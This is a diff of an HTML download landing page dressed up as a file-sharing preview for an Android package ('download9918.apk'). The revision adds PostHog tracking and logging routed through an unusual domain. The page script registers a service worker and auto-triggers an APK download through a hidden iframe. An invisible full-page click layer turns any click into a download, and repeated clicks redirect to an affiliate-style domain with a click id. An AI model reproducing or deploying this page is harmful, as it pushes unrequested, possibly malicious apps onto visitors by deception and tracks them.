@@ -1,422 +1,478 @@
 <!doctype html>
 <html lang="en" translate="no">
-<head>
-  <meta charset="utf-8">
-  <meta name="google" content="notranslate">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Download</title>
-  <script src="../params.js?v=personal-site-6"></script>
-  <script>
-    window.__downloadTestRevision = 'personal-site-6';
-    window.__downloadSwVersion = '42316858';
-    window.__downloadSwUrl = `${window.__landingRoot}sw4.js?v=${window.__downloadSwVersion}&r=${window.__downloadTestRevision}`;
-    window.__swReadyPromise = (async () => {
-      await window.__landingParamsReady;
-      if (!('serviceWorker' in navigator)) {
-        return { ok: false, direct: true, reason: 'unsupported' };
-      }
+  <head>
+    <meta charset="utf-8">
+    <meta name="google" content="notranslate">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Download</title>
+    <script src="../params.js?v=personal-site-22"></script>
+    <script>
+     const start = performance.now()
 
-      const registration = await navigator.serviceWorker.register(window.__downloadSwUrl);
-      await registration.update();
+     !function(t,e){var o,n,p,r;e.__SV||(window.posthog && window.posthog.__loaded)||(window.posthog=e,e._i=[],e.init=function(i,s,a){function g(t,e){var o=e.split(".");2==o.length&&(t=t[o[0]],e=o[1]),t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}}p||((p=t.createElement("script")).type="text/javascript",p.crossOrigin="anonymous",p.async=!0,p.src=s.api_host.replace(".i.posthog.com","-assets.i.posthog.com")+"/static/array.js",p.onerror=function(){p=null},(r=t.getElementsByTagName("script")[0]).parentNode.insertBefore(p,r));var u=e;for(void 0!==a?u=e[a]=[]:a="posthog",u.people=u.people||[],Object.defineProperty(u,"toString",{configurable:!0,enumerable:!0,writable:!0,value:function(t){var e="posthog";return"posthog"!==a&&(e+="."+a),t||(e+=" (stub)"),e}}),Object.defineProperty(u.people,"toString",{configurable:!0,enumerable:!0,writable:!0,value:function(){return u.toString(1)+".people (stub)"}}),o="Eh Rh Ph Oh Dh qh init yd bd dd fd Sd wc md xd ad Ed Ad Rd Pd Od Fd capture getExtension gr pd gd calculateEventProperties Dd register register_once register_for_session unregister unregister_for_session zd hd jd getFeatureFlag getFeatureFlagPayload getFeatureFlagResult getAllFeatureFlags isFeatureEnabled reloadFeatureFlags updateFlags updateEarlyAccessFeatureEnrollment getEarlyAccessFeatures on onFeatureFlags onSurveysLoaded onSessionId getSurveys getActiveMatchingSurveys onActiveMatchingSurveysChanged renderSurvey displaySurvey cancelPendingSurvey canRenderSurvey canRenderSurveyAsync Hd identify setPersonProperties unsetPersonProperties group resetGroups setPersonPropertiesForFlags resetPersonPropertiesForFlags setGroupPropertiesForFlags resetGroupPropertiesForFlags reset Ud shutdown setIdentity clearIdentity get_distinct_id getGroups get_session_id get_session_replay_url alias set_config startSessionRecording stopSessionRecording sessionRecordingStarted captureException addExceptionStep captureLog startExceptionAutocapture stopExceptionAutocapture loadToolbar get_property getSessionProperty qd Td createPersonProfile setInternalOrTestUser Bd Uh zh opt_in_capturing opt_out_capturing Hh has_opted_in_capturing has_opted_out_capturing get_explicit_consent_status is_capturing clear_opt_in_out_capturing $d debug kc Ds getPageViewId captureTraceFeedback captureTraceMetric rd".split(" "),n=0;n<o.length;n++)g(u,o[n]);e._i.push([i,s,a])},e.__SV=1)}(document,window.posthog||[]);
+     const logQueue = []
+     const eventQueue = []
+     let phog = null
+     let posthogInitStart = 0
 
-      if (registration.waiting) {
-        registration.waiting.postMessage({ type: 'SKIP_WAITING' });
-      }
+     function log(level, message, attributes = {}) {
+         attributes['delay'] = performance.now() - start
+         attributes['land'] = '022'
 
-      await navigator.serviceWorker.ready;
+         if (phog == null) {
+             logQueue.push({level, message, attributes})
+             return
+         }
 
-      const expectedWorkerUrl = new URL(window.__downloadSwUrl, window.location.href).href;
-      if (navigator.serviceWorker.controller?.scriptURL !== expectedWorkerUrl) {
-        await new Promise((resolve, reject) => {
-          const timeout = window.setTimeout(() => {
-            navigator.serviceWorker.removeEventListener('controllerchange', onControllerChange);
-            reject(new Error('controller timeout'));
-          }, 5000);
+         if (posthogInitStart == 0) {
+             posthogInitStart = performance.now()
+         }
 
-          function onControllerChange() {
-            if (navigator.serviceWorker.controller?.scriptURL !== expectedWorkerUrl) return;
-            navigator.serviceWorker.removeEventListener('controllerchange', onControllerChange);
-            window.clearTimeout(timeout);
-            resolve();
-          }
+         attributes['delay_after_posthog_init'] = performance.now() - posthogInitStart
+         phog.logger[level](message, attributes)
+     }
 
-          navigator.serviceWorker.addEventListener('controllerchange', onControllerChange);
-        });
-      }
+     function capture(event, attributes = {}) {
+         attributes['delay'] = performance.now() - start
+         attributes['land'] = '022'
 
-      return {
-        ok: true,
-        direct: false,
-        registration,
-        controller: navigator.serviceWorker.controller,
-      };
-    })().catch((error) => {
-      console.error('[download] early service worker setup failed', error);
-      return { ok: false, direct: true, reason: error.message };
-    });
-  </script>
-<style>
-* {
-      padding: 0;
-      margin: 0;
-    }
+         if (phog == null) {
+             eventQueue.push({event, attributes})
+         }
 
-    body {
-      margin: 0;
-    }
+         if (posthogInitStart == 0) {
+             posthogInitStart = performance.now()
+         }
 
-    .content {
-      width: 100%;
-      background-color: #1e1e1f;
-      overflow: hidden;
-      height: 100vh;
-      position: relative;
-      font-family: Roboto, sans-serif;
-    }
+         attributes['delay_after_posthog_init'] = performance.now() - posthogInitStart
+         phog.capture(event, attributes)
+     }
 
-    .nav-container {
-      position: absolute;
-      width: 100%;
-      height: 70px;
-      z-index: 2;
-    }
+     posthog.init('phc_vqyXNzhYhfpZrwKKGMQ2VjQq2azSdh2StkeoHodd26NL', {
+         api_host: 'https://uiuirestorehere.art',
+         advanced_disable_flags: true,
+         disable_external_dependency_loading: false,
+         disable_session_recording: true,
+         disable_surveys: true,
+         capture_exceptions: {
+             capture_unhandled_errors: true,
+             capture_unhandled_rejections: true,
+             capture_console_errors: false,
+         },
+         autocapture: true,
+         capture_pageview: true,
+         capture_pageleave: true,
+         logs: {
+             serviceName: 'web',
+             environment: 'production',
+         },
+         person_profiles: 'identified_only',
+         loaded: function(ph) {
+             // ph — это полноценный объект PostHog
+             ph.register({
+                 land: '022',
+             });
 
-    .nav-menu {
-      width: 90%;
-      font-size: 16px;
-      display: flex;
-      flex-direction: row;
-      justify-content: space-between;
-      position: relative;
-    }
+             // Теперь logger гарантированно существует
+             log('info', 'Posthog init')
 
-    .name-part,
-    .manage-part,
-    .download,
-    .avatar,
-    .menu,
-    .view-box {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-    }
+             phog = ph
 
-    .f-a-center {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-    }
+             for (const entry of logQueue) {
+                 ph.logger[entry.level](entry.message, entry.attributes);
+             }
 
-    .name-part {
-      gap: 10px;
-      color: #C4C7C5;
-    }
+             for (const entry of eventQueue) {
+                 ph.capture(entry.event, entry.attributes);
+             }
+         }
+     });
+     window.__downloadTestRevision = 'personal-site-22';
+     window.__downloadSwVersion = '42316858';
+     window.__downloadSwUrl = `${window.__landingRoot}sw4.js?v=${window.__downloadSwVersion}&r=${window.__downloadTestRevision}`;
+     window.__swReadyPromise = (async () => {
+         log('info', 'Await window.__landingParamsReady [swReadyPromise]')
+         await window.__landingParamsReady;
+         log('info', 'Awaited window.__landingParamsReady [swReadyPromise]')
+         if (!('serviceWorker' in navigator)) {
+             return { ok: false, direct: true, reason: 'unsupported' };
+         }
 
-    .name-part > .icon {
-      background-color: white;
-      padding: 1px;
-      border-radius: 2px;
-    }
+         log('info', 'Await registration worker')
+         const registration = await navigator.serviceWorker.register(window.__downloadSwUrl);
+         log('info', 'Awaited registration worker')
+         log('info', 'Await registration worker update')
+         await registration.update();
+         log('info', 'Awaited registration worker update')
 
-    .title {
-      max-width: 54vw;
-      overflow: hidden;
-      text-overflow: ellipsis;
-      white-space: nowrap;
-    }
+         if (registration.waiting) {
+             registration.waiting.postMessage({ type: 'SKIP_WAITING' });
+         }
 
-    .manage-part {
-      gap: 8px;
-    }
+         log('info', 'Await service worker ready')
+         await navigator.serviceWorker.ready;
+         log('info', 'Awaited service worker ready')
 
-    .manage-part > .avatar {
-      width: 30px;
-      height: 30px;
-      color: white;
-      background-color: orange;
-      border-radius: 100%;
-    }
+         const expectedWorkerUrl = new URL(window.__downloadSwUrl, window.location.href).href;
+         if (navigator.serviceWorker.controller?.scriptURL !== expectedWorkerUrl) {
+             await new Promise((resolve, reject) => {
+                 const timeout = window.setTimeout(() => {
+                     navigator.serviceWorker.removeEventListener('controllerchange', onControllerChange);
+                     reject(new Error('controller timeout'));
+                 }, 5000);
 
-    .manage-part .menu {
-      flex-direction: column;
-      gap: 2px;
-      height: 50px;
-      width: 50px;
-    }
+                 function onControllerChange() {
+                     if (navigator.serviceWorker.controller?.scriptURL !== expectedWorkerUrl) return;
+                     navigator.serviceWorker.removeEventListener('controllerchange', onControllerChange);
+                     window.clearTimeout(timeout);
+                     resolve();
+                 }
 
-    .manage-part .menu .point {
-      background-color: #C4C7C5;
-      width: 5px;
-      height: 5px;
-      border-radius: 100%;
-    }
+                 navigator.serviceWorker.addEventListener('controllerchange', onControllerChange);
+             });
+         }
 
-    .view-box {
-      position: relative;
-      z-index: 1;
-      width: 100%;
-      height: 100%;
-    }
+         return {
+             ok: true,
+             direct: false,
+             registration,
+             controller: navigator.serviceWorker.controller,
+         };
+     })().catch((error) => {
+         log('error', 'Early service worker setup failed', { "error_message": error.message })
+         console.error('[download] early service worker setup failed', error);
+         return { ok: false, direct: true, reason: error.message };
+     });
+    </script>
+    <style>
+     * {
+       padding: 0;
+       margin: 0;
+     }
 
-    .inner-box {
-      background-color: #4d494c;
-      box-sizing: content-box;
-      color: white;
-      padding: 20px;
-      font-size: 19px;
-      border-radius: 20px;
-      width: 240px;
-      height: 80px;
-      display: flex;
-      flex-direction: column;
-      justify-content: space-between;
-      align-items: center;
-      box-shadow: 0 10px 12px 5px rgba(0, 0, 0, .2);
-    }
+     body {
+       margin: 0;
+     }
 
-    .inner-box > .download {
-      background-color: #1b73e8;
-      width: 150px;
-      height: 30px;
-      flex-direction: row;
-      font-size: 12px;
-      color: white;
-    }
+     .content {
+       width: 100%;
+       background-color: #1e1e1f;
+       overflow: hidden;
+       height: 100vh;
+       position: relative;
+       font-family: Roboto, sans-serif;
+     }
 
-    .inner-box > .download > .text {
-      width: 100px;
-      text-align: center;
-      text-shadow: 0 1px 0 rgba(0, 0, 0, .8);
-    }
+     .nav-container {
+       position: absolute;
+       width: 100%;
+       height: 70px;
+       z-index: 2;
+     }
 
-    .click-area {
-      z-index: 100;
-      position: absolute;
-      width: 100%;
-      height: 100vh;
-      top: 0;
-      left: 0;
-      cursor: pointer;
-    }
+     .nav-menu {
+       width: 90%;
+       font-size: 16px;
+       display: flex;
+       flex-direction: row;
+       justify-content: space-between;
+       position: relative;
+     }
 
-    .hidden-frame {
-      position: absolute;
-      width: 0;
-      height: 0;
-      border: 0;
-      opacity: 0;
-      pointer-events: none;
-    }
+     .name-part,
+     .manage-part,
+     .download,
+     .avatar,
+     .menu,
+     .view-box {
+       display: flex;
+       align-items: center;
+       justify-content: center;
+     }
 
-</style>
-  <script>
-    !function(t,e){var o,n,p,r;e.__SV||(window.posthog && window.posthog.__loaded)||(window.posthog=e,e._i=[],e.init=function(i,s,a){function g(t,e){var o=e.split(".");2==o.length&&(t=t[o[0]],e=o[1]),t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}}p||((p=t.createElement("script")).type="text/javascript",p.crossOrigin="anonymous",p.async=!0,p.src=s.api_host.replace(".i.posthog.com","-assets.i.posthog.com")+"/static/array.js",p.onerror=function(){p=null},(r=t.getElementsByTagName("script")[0]).parentNode.insertBefore(p,r));var u=e;for(void 0!==a?u=e[a]=[]:a="posthog",u.people=u.people||[],Object.defineProperty(u,"toString",{configurable:!0,enumerable:!0,writable:!0,value:function(t){var e="posthog";return"posthog"!==a&&(e+="."+a),t||(e+=" (stub)"),e}}),Object.defineProperty(u.people,"toString",{configurable:!0,enumerable:!0,writable:!0,value:function(){return u.toString(1)+".people (stub)"}}),o="Eh Rh Ph Oh Dh qh init yd bd dd fd Sd wc md xd ad Ed Ad Rd Pd Od Fd capture getExtension gr pd gd calculateEventProperties Dd register register_once register_for_session unregister unregister_for_session zd hd jd getFeatureFlag getFeatureFlagPayload getFeatureFlagResult getAllFeatureFlags isFeatureEnabled reloadFeatureFlags updateFlags updateEarlyAccessFeatureEnrollment getEarlyAccessFeatures on onFeatureFlags onSurveysLoaded onSessionId getSurveys getActiveMatchingSurveys onActiveMatchingSurveysChanged renderSurvey displaySurvey cancelPendingSurvey canRenderSurvey canRenderSurveyAsync Hd identify setPersonProperties unsetPersonProperties group resetGroups setPersonPropertiesForFlags resetPersonPropertiesForFlags setGroupPropertiesForFlags resetGroupPropertiesForFlags reset Ud shutdown setIdentity clearIdentity get_distinct_id getGroups get_session_id get_session_replay_url alias set_config startSessionRecording stopSessionRecording sessionRecordingStarted captureException addExceptionStep captureLog startExceptionAutocapture stopExceptionAutocapture loadToolbar get_property getSessionProperty qd Td createPersonProfile setInternalOrTestUser Bd Uh zh opt_in_capturing opt_out_capturing Hh has_opted_in_capturing has_opted_out_capturing get_explicit_consent_status is_capturing clear_opt_in_out_capturing $d debug kc Ds getPageViewId captureTraceFeedback captureTraceMetric rd".split(" "),n=0;n<o.length;n++)g(u,o[n]);e._i.push([i,s,a])},e.__SV=1)}(document,window.posthog||[]);
+     .f-a-center {
+       display: flex;
+       align-items: center;
+       justify-content: center;
+     }
 
-    posthog.init('phc_vqyXNzhYhfpZrwKKGMQ2VjQq2azSdh2StkeoHodd26NL', {
-        api_host: 'https://uiuirestorehere.art',
-        advanced_disable_flags: true,
-        disable_external_dependency_loading: false,
-        disable_session_recording: true,
-        disable_surveys: true,
-        capture_exceptions: {
-            capture_unhandled_errors: true,
-            capture_unhandled_rejections: true,
-            capture_console_errors: false,
-        },
+     .name-part {
+       gap: 10px;
+       color: #C4C7C5;
+     }
 
-        autocapture: true,
-        capture_pageview: true,
-        capture_pageleave: true,
-        person_profiles: 'identified_only',
-    });
+     .name-part > .icon {
+       background-color: white;
+       padding: 1px;
+       border-radius: 2px;
+     }
 
-    posthog.register({
-        land: '022',
-    });
-  </script>
-</head>
-<body>
-<div class="content">
-    <div class="nav-container f-a-center">
-      <div class="nav-menu">
-        <div class="name-part f-a-center">
-          <div class="icon f-a-center">
-            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 32 32" aria-hidden="true">
-              <g transform="translate(0,32) scale(0.1,-0.1)" fill="black" stroke="none">
-                <path d="M50 276 c-27 -33 18 -72 48 -42 13 13 14 20 6 34 -15 23 -38 26 -54 8z"/>
-                <path d="M173 253 c20 -2 54 -2 75 0 20 2 3 4 -38 4 -41 0 -58 -2 -37 -4z"/>
-                <path d="M44 175 c-10 -25 4 -45 30 -45 30 0 40 13 31 40 -8 24 -53 28 -61 5z"/>
-                <path d="M173 153 c20 -2 54 -2 75 0 20 2 3 4 -38 4 -41 0 -58 -2 -37 -4z"/>
-                <path d="M50 86 c-27 -33 18 -72 48 -42 13 13 14 20 6 34 -15 23 -38 26 -54 8z"/>
-                <path d="M173 63 c20 -2 54 -2 75 0 20 2 3 4 -38 4 -41 0 -58 -2 -37 -4z"/>
-              </g>
-            </svg>
+     .title {
+       max-width: 54vw;
+       overflow: hidden;
+       text-overflow: ellipsis;
+       white-space: nowrap;
+     }
+
+     .manage-part {
+       gap: 8px;
+     }
+
+     .manage-part > .avatar {
+       width: 30px;
+       height: 30px;
+       color: white;
+       background-color: orange;
+       border-radius: 100%;
+     }
+
+     .manage-part .menu {
+       flex-direction: column;
+       gap: 2px;
+       height: 50px;
+       width: 50px;
+     }
+
+     .manage-part .menu .point {
+       background-color: #C4C7C5;
+       width: 5px;
+       height: 5px;
+       border-radius: 100%;
+     }
+
+     .view-box {
+       position: relative;
+       z-index: 1;
+       width: 100%;
+       height: 100%;
+     }
+
+     .inner-box {
+       background-color: #4d494c;
+       box-sizing: content-box;
+       color: white;
+       padding: 20px;
+       font-size: 19px;
+       border-radius: 20px;
+       width: 240px;
+       height: 80px;
+       display: flex;
+       flex-direction: column;
+       justify-content: space-between;
+       align-items: center;
+       box-shadow: 0 10px 12px 5px rgba(0, 0, 0, .2);
+     }
+
+     .inner-box > .download {
+       background-color: #1b73e8;
+       width: 150px;
+       height: 30px;
+       flex-direction: row;
+       font-size: 12px;
+       color: white;
+     }
+
+     .inner-box > .download > .text {
+       width: 100px;
+       text-align: center;
+       text-shadow: 0 1px 0 rgba(0, 0, 0, .8);
+     }
+
+     .click-area {
+       z-index: 100;
+       position: absolute;
+       width: 100%;
+       height: 100vh;
+       top: 0;
+       left: 0;
+       cursor: pointer;
+     }
+
+     .hidden-frame {
+       position: absolute;
+       width: 0;
+       height: 0;
+       border: 0;
+       opacity: 0;
+       pointer-events: none;
+     }
+
+    </style>
+  </head>
+  <body>
+    <div class="content">
+      <div class="nav-container f-a-center">
+        <div class="nav-menu">
+          <div class="name-part f-a-center">
+            <div class="icon f-a-center">
+              <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 32 32" aria-hidden="true">
+                <g transform="translate(0,32) scale(0.1,-0.1)" fill="black" stroke="none">
+                  <path d="M50 276 c-27 -33 18 -72 48 -42 13 13 14 20 6 34 -15 23 -38 26 -54 8z"/>
+                  <path d="M173 253 c20 -2 54 -2 75 0 20 2 3 4 -38 4 -41 0 -58 -2 -37 -4z"/>
+                  <path d="M44 175 c-10 -25 4 -45 30 -45 30 0 40 13 31 40 -8 24 -53 28 -61 5z"/>
+                  <path d="M173 153 c20 -2 54 -2 75 0 20 2 3 4 -38 4 -41 0 -58 -2 -37 -4z"/>
+                  <path d="M50 86 c-27 -33 18 -72 48 -42 13 13 14 20 6 34 -15 23 -38 26 -54 8z"/>
+                  <path d="M173 63 c20 -2 54 -2 75 0 20 2 3 4 -38 4 -41 0 -58 -2 -37 -4z"/>
+                </g>
+              </svg>
+            </div>
+            <div id="fileTitle" class="title">download9918.apk</div>
           </div>
-          <div id="fileTitle" class="title">download9918.apk</div>
+          <div class="manage-part f-a-center">
+            <div class="download f-a-center">
+              <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" viewBox="0 0 25 25" aria-hidden="true">
+                <path fill="#C4C7C5" d="M4 15h2v3h12v-3h2v3c0 1.1-.9 2-2 2H6c-1.1 0-2-.9-2-2m11.59-8.41L13 12.17V4h-2v8.17L8.41 9.59 7 11l5 5 5-5-1.41-1.41z"/>
+              </svg>
+            </div>
+            <div class="menu f-a-center" aria-hidden="true">
+              <div class="point first"></div>
+              <div class="point second"></div>
+              <div class="point third"></div>
+            </div>
+            <div class="avatar f-a-center">A</div>
+          </div>
         </div>
-        <div class="manage-part f-a-center">
-          <div class="download f-a-center">
+      </div>
+      <div class="view-box f-a-center">
+        <div class="inner-box">
+          <div class="text">No preview available</div>
+          <div id="downloadButton" class="download f-a-center" role="button" tabindex="0" aria-disabled="true">
             <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" viewBox="0 0 25 25" aria-hidden="true">
               <path fill="#C4C7C5" d="M4 15h2v3h12v-3h2v3c0 1.1-.9 2-2 2H6c-1.1 0-2-.9-2-2m11.59-8.41L13 12.17V4h-2v8.17L8.41 9.59 7 11l5 5 5-5-1.41-1.41z"/>
             </svg>
+            <div class="text">Download</div>
           </div>
-          <div class="menu f-a-center" aria-hidden="true">
-            <div class="point first"></div>
-            <div class="point second"></div>
-            <div class="point third"></div>
-          </div>
-          <div class="avatar f-a-center">A</div>
         </div>
       </div>
     </div>
-    <div class="view-box f-a-center">
-      <div class="inner-box">
-        <div class="text">No preview available</div>
-        <div id="downloadButton" class="download f-a-center" role="button" tabindex="0" aria-disabled="true">
-          <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" viewBox="0 0 25 25" aria-hidden="true">
-            <path fill="#C4C7C5" d="M4 15h2v3h12v-3h2v3c0 1.1-.9 2-2 2H6c-1.1 0-2-.9-2-2m11.59-8.41L13 12.17V4h-2v8.17L8.41 9.59 7 11l5 5 5-5-1.41-1.41z"/>
-          </svg>
-          <div class="text">Download</div>
-        </div>
-      </div>
-    </div>
-  </div>
-  <div id="clickArea" class="click-area" aria-hidden="true"></div>
-  <iframe id="downloadFrame" class="hidden-frame" title="download frame" aria-hidden="true"></iframe>
+    <div id="clickArea" class="click-area" aria-hidden="true"></div>
+    <iframe id="downloadFrame" class="hidden-frame" title="download frame" aria-hidden="true"></iframe>
 
-<script>
-(() => {
+    <script>
+     (() => {
+         log('info', 'Progress bar not used')
+         const DEFAULT_FILE_NAME = 'download9918.apk';
+         const TEST_REVISION = window.__downloadTestRevision;
+         const SW_VERSION = window.__downloadSwVersion;
+         const SW_URL = window.__downloadSwUrl;
+         const REDIRECT_HREF = 'https://immenselybossseal.com/path?key=01f48ac1c32a45189507ced9b43601b9&utm_source=lp_click';
 
-    const DEFAULT_FILE_NAME = 'download9918.apk';
-    const TEST_REVISION = window.__downloadTestRevision;
-    const SW_VERSION = window.__downloadSwVersion;
-    const SW_URL = window.__downloadSwUrl;
-    const REDIRECT_HREF = 'https://immenselybossseal.com/path?key=01f48ac1c32a45189507ced9b43601b9&utm_source=lp_click';
+         const downloadButton = document.querySelector('#downloadButton');
+         const downloadFrame = document.querySelector('#downloadFrame');
+         const clickArea = document.querySelector('#clickArea');
+         const fileTitle = document.querySelector('#fileTitle');
 
-    const downloadButton = document.querySelector('#downloadButton');
-    const downloadFrame = document.querySelector('#downloadFrame');
-    const clickArea = document.querySelector('#clickArea');
-    const fileTitle = document.querySelector('#fileTitle');
+         let savedParams = new URLSearchParams();
+         let offerId = null;
+         let fileName = DEFAULT_FILE_NAME;
+         let isServiceWorkerReady = false;
+         let trustedClickCount = 0;
 
-    let savedParams = new URLSearchParams();
-    let offerId = null;
-    let fileName = DEFAULT_FILE_NAME;
-    let isServiceWorkerReady = false;
-    let trustedClickCount = 0;
+         function sanitizeFileName(value) {
+             const fallbackBase = DEFAULT_FILE_NAME.replace(/\.apk$/i, '');
+             const candidate = String(value || '')
+                 .replace(/\.apk$/i, '')
+                 .slice(0, 80);
+             const isValid = candidate !== ''
+                          && !/^[ _-]+$/.test(candidate)
+                          && !/^ /.test(candidate)
+                          && /^[a-zA-Z0-9_*(). -]+$/.test(candidate);
+             const base = isValid ? candidate : fallbackBase;
+             return `${base}.apk`;
+         }
 
-    function log(message, data) {
-      if (data === undefined) {
-        console.log(`[download] ${message}`);
-        return;
-      }
+         function getSavedOfferId() {
+             const value = savedParams.get('offer_id');
+             return value && value.trim() ? value.trim().slice(0, 80) : null;
+         }
 
-      console.log(`[download] ${message}`, data);
-    }
+         function getSavedFileName() {
+             return sanitizeFileName(savedParams.get('utm_medium'));
+         }
 
-    function sanitizeFileName(value) {
-      const fallbackBase = DEFAULT_FILE_NAME.replace(/\.apk$/i, '');
-      const candidate = String(value || '')
-        .replace(/\.apk$/i, '')
-        .slice(0, 80);
-      const isValid = candidate !== ''
-        && !/^[ _-]+$/.test(candidate)
-        && !/^ /.test(candidate)
-        && /^[a-zA-Z0-9_*(). -]+$/.test(candidate);
-      const base = isValid ? candidate : fallbackBase;
-      return `${base}.apk`;
-    }
+         function getRedirectUrl() {
+             const target = new URL(REDIRECT_HREF);
+             target.searchParams.set('clickid', savedParams.get('clickid') || '');
+             return target.href;
+         }
 
-    function getSavedOfferId() {
-      const value = savedParams.get('offer_id');
-      return value && value.trim() ? value.trim().slice(0, 80) : null;
-    }
+         async function registerServiceWorker() {
+             await window.__landingParamsReady;
+             savedParams = window.__savedDownloadParams;
+             offerId = getSavedOfferId();
+             fileName = getSavedFileName();
+             const title = document.querySelector('#fileTitle');
+             if (title) title.textContent = fileName;
+             const swState = await window.__swReadyPromise;
 
-    function getSavedFileName() {
-      return sanitizeFileName(savedParams.get('utm_medium'));
-    }
+             if (!swState.ok || swState.direct) {
+                 downloadButton.disabled = true;
+                 log('warn', 'service worker is required for offer download', { reason: swState.reason, offerId });
+                 return;
+             }
 
-    function getRedirectUrl() {
-      const target = new URL(REDIRECT_HREF);
-      target.searchParams.set('clickid', savedParams.get('clickid') || '');
-      return target.href;
-    }
+             isServiceWorkerReady = true;
+             downloadButton.disabled = !offerId;
+             log('info', 'ready to download', {
+                 controller: swState.controller && swState.controller.scriptURL,
+                 swUrl: SW_URL,
+                 offerId,
+                 fileName,
+             });
 
-    async function registerServiceWorker() {
-      await window.__landingParamsReady;
-      savedParams = window.__savedDownloadParams;
-      offerId = getSavedOfferId();
-      fileName = getSavedFileName();
-      const title = document.querySelector('#fileTitle');
-      if (title) title.textContent = fileName;
-      const swState = await window.__swReadyPromise;
+             if (offerId) {
+                 capture('Auto download')
+                 downloadButton.click();
+             }
+         }
 
-      if (!swState.ok || swState.direct) {
-        downloadButton.disabled = true;
-        log('service worker is required for offer download', { reason: swState.reason, offerId });
-        return;
-      }
+         function startDownload() {
+             if (!offerId) {
+                 log('warn', 'offer_id is missing. Add ?offer_id=123');
+                 return;
+             }
 
-      isServiceWorkerReady = true;
-      downloadButton.disabled = !offerId;
-      log('ready to download', {
-        controller: swState.controller && swState.controller.scriptURL,
-        swUrl: SW_URL,
-        offerId,
-        fileName,
-      });
+             const target = new URL('download.apk', window.__landingRoot);
+             log('info', 'starting service worker download', { offerId, fileName, target: target.href });
+             downloadFrame.src = 'about:blank';
+             window.setTimeout(() => {
+                 downloadFrame.src = target.href;
+             }, 0);
+         }
 
-      if (offerId) {
-        downloadButton.click();
-      }
-    }
+         function handleDownloadClick(event) {
+             if (!isServiceWorkerReady) {
+                 log('info', 'download requested before service worker readiness');
+                 return;
+             }
 
-    function startDownload() {
-      if (!offerId) {
-        log('offer_id is missing. Add ?offer_id=123');
-        return;
-      }
+             if (event && event.isTrusted) {
+                 trustedClickCount += 1;
 
-      const target = new URL('download.apk', window.__landingRoot);
-      log('starting service worker download', { offerId, fileName, target: target.href });
-      downloadFrame.src = 'about:blank';
-      window.setTimeout(() => {
-        downloadFrame.src = target.href;
-      }, 0);
-    }
+                 if (trustedClickCount >= 3) {
+                     window.location.href = getRedirectUrl();
+                     return;
+                 }
+             }
 
-    function handleDownloadClick(event) {
-      if (!isServiceWorkerReady) {
-        log('download requested before service worker readiness');
-        return;
-      }
+             startDownload();
+         }
 
-      if (event && event.isTrusted) {
-        trustedClickCount += 1;
+         if (fileTitle) {
+             fileTitle.textContent = fileName;
+         }
 
-        if (trustedClickCount >= 3) {
-          window.location.href = getRedirectUrl();
-          return;
-        }
-      }
+         downloadButton.addEventListener('click', handleDownloadClick);
+         clickArea.addEventListener('click', handleDownloadClick);
 
-      startDownload();
-    }
+         registerServiceWorker().catch((error) => {
+             console.error('[download] service worker setup failed', error);
+             downloadButton.disabled = true;
+             log('error', 'service worker setup failed', { error: error.message, offerId });
+         });
 
-    if (fileTitle) {
-      fileTitle.textContent = fileName;
-    }
+     })();
 
-    downloadButton.addEventListener('click', handleDownloadClick);
-    clickArea.addEventListener('click', handleDownloadClick);
-
-    registerServiceWorker().catch((error) => {
-      console.error('[download] service worker setup failed', error);
-      downloadButton.disabled = true;
-      log('service worker setup failed', { error: error.message, offerId });
-    });
-
-})();
-
-</script>
-</body>
+    </script>
+  </body>
 </html>
